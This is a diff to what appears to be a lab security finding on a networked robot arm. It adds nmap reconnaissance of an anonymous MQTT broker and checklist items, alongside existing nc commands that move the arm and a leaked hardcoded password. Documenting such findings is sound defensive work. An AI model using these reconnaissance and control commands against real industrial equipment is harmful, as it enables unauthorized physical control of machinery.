@@ -19,7 +19,7 @@ verified_date: ""
 
 ## Why It Matters
 
-The robot arm is reachable over three network services on the flat lab LAN: a raw serial-over-TCP bus (`:2000`), Modbus/TCP (`:502`), and MQTT (`:1883`). All three are reachable without credentials, but the difficulty of moving the arm varies. The raw bus now requires the hardcoded `PASS:` prefix, Modbus/TCP requires the password XOR-encrypted into holding registers, and MQTT auto-injects the password for any publisher. The net result is still unauthenticated physical control for anyone who discovers the easiest path (MQTT) or extracts the leaked Modbus hint, which is the canonical ICS exposure: network reachability becomes actuator control.
+The robot arm is reachable over three network services on the flat lab LAN: a raw serial-over-TCP bus (`:2000`), Modbus/TCP (`:502`), and MQTT (`:1883`). All three are reachable without credentials, but the difficulty of moving the arm varies. The raw bus now requires the hardcoded `PASS:` prefix, Modbus/TCP requires the password XOR-encrypted into holding registers, and MQTT auto-injects the password for any publisher. The net result is still unauthenticated physical control for anyone who discovers the easiest path (MQTT) or extracts the leaked Modbus hint, which is the canonical ICS exposure: network reachability becomes actuator control. Reconnaissance is trivial: nmap's `mqtt-subscribe` script succeeds anonymously and leaks the broker version plus full `$SYS` telemetry, while `8883/tcp` is closed, confirming no TLS path exists.
 
 ## Root Cause
 
@@ -69,6 +69,16 @@ Firmware analysis confirms that the insecurity is baked into the base image: `bi
 ```bash
 # Service discovery
 nmap -sV -p 2000,502,1883 192.168.2.1
+
+# Detailed MQTT reconnaissance also discloses the broker version and $SYS statistics
+nmap -sC -sV -p 1883,8883 192.168.2.1
+# 1883/tcp open  mosquitto version 2.0.18
+# | mqtt-subscribe: anonymous $SYS topic readback succeeds, leaking:
+# |   $SYS/broker/version: mosquitto version 2.0.18
+# |   $SYS/broker/clients/connected: 2
+# |   $SYS/broker/subscriptions/count: 1
+# |_  ... full broker telemetry readable without credentials
+# 8883/tcp closed secure-mqtt
 
 # A. Raw serial bus - movement without PASS: is dropped and leaks the hint
 printf 'S3:5\n' | nc 192.168.2.1 2000
@@ -133,6 +143,8 @@ Put the OT services behind authentication and transport security: client certifi
 ## Verification Checklist
 
 - [ ] `nmap -sV` shows `:2000`, `:502`, `:1883` open
+- [ ] `nmap -sC -sV -p 1883,8883` fingerprints `mosquitto version 2.0.18` and reads `$SYS/broker/*` telemetry without credentials
+- [ ] `nmap -sC -sV -p 1883,8883` shows `8883/tcp closed secure-mqtt`
 - [ ] `printf 'S0:90\n' | nc :2000` does **not** move the arm and returns `ERR AUTH: movement commands require PASS:OctoSuperBot2026 <cmd>`
 - [ ] `printf 'PASS:OctoSuperBot2026 S0:90\n' | nc :2000` moves the arm
 - [ ] Modbus register write without prior encrypted password returns an exception and writes `OctoSuperBot2026` to hint registers 40038-40053
